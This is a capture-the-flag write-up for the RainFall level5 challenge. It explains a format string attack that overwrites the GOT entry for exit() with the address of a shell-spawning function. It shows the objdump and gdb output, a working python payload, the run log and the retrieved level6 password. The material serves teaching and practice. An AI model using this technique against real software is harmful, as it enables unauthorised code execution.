We were tasked with exploiting a format string vulnerability in the `level5` binary to gain access to the next level (`level6`).

### 1. **Vulnerabilities Identified**:
   - **Format String Vulnerability**: The program uses `printf` which is vulnerable to a format string attack. This allows you to write arbitrary data to memory locations.
   - **Writable Global Offset Table (GOT)**: The GOT stores the addresses of dynamically linked functions like `exit()`. Since it’s writable, you can overwrite a function pointer in the GOT, causing the program to call another function (in this case, the `o()` function which calls `system()` and spawns a shell).
   
### 2. **Analyzing the Binary**:
   - We used GDB and `objdump` to analyze the binary.
   - The function `o()` was located at address `0x080484a4`.
   - The address of `exit()` in the GOT was found to be `0x08049838`.

``` bash 
level5@RainFall:~$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit

(gdb) info function o
All functions matching regular expression "o":

Non-debugging symbols:
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x08048420  __do_global_dtors_aux
0x080484a4  o
0x080485a0  __do_global_ctors_aux
(gdb)

```

### 3. **Exploitation**:
   - **Goal**: We wanted to overwrite the address of `exit()` in the GOT with the address of the function `o()`, so that whenever the program calls `exit()`, it would instead jump to `o()`, which would then call `system()` and spawn a shell.
   
   - **Steps to Exploit**:
     1. **Find the address of `exit()`**: The address of `exit()` in the GOT was found at `0x08049838`.
     2. **Find the address of `o()`**: The address of `o()` was found at `0x080484a4`.
     3. **Craft the Format String**: To overwrite the GOT entry for `exit()`, we created a format string that would:
        - Print a specific number of characters (`%134513824d`) to match the address of `o()` in decimal.
        - Use `%n` to write that value to the address of `exit()` in the GOT.
     4. **Execute the Exploit**: We crafted the following format string attack:
        ```python
        python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit5
        ```
        This attack overwrites the GOT entry for `exit()` with the address of `o()`. When `exit()` is called later in the program, it jumps to `o()`, which then calls `system()` and spawns a shell.

### 4. **Final Execution**:
   - You ran the exploit:
     ```bash
    cat /tmp/exploit5 - | ./level5 | tr -d " "     
    whoami
    8level6
    cat /home/user/level6/.pass
    d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
    ^C
    level5@RainFall:~$ su level
    ```

     This shows that you successfully switched to `level6` by executing the format string attack.

### 5. **Accessing the Flag**:
   - After spawning the shell, you switched to the `level6` user using `su level6` and retrieved the flag from the `.pass` file.

### 6. **Key Concepts**:
   - **Format String Attack**: By manipulating the format string in `printf`, you were able to control the program's memory and overwrite specific locations (in this case, the GOT entry).
   - **Global Offset Table (GOT)**: This table holds addresses of dynamically linked functions. By overwriting an entry in the GOT, you can change the function that gets called, leading to arbitrary code execution.
   - **Writable Memory**: Exploiting writable sections like the GOT and buffer overflows allows you to gain control over the program’s flow.

You successfully exploited the vulnerability, overwrote the GOT entry, and gained access to the shell to move on to `level6`. This is a classic example of leveraging a format string vulnerability and manipulating memory to execute arbitrary code.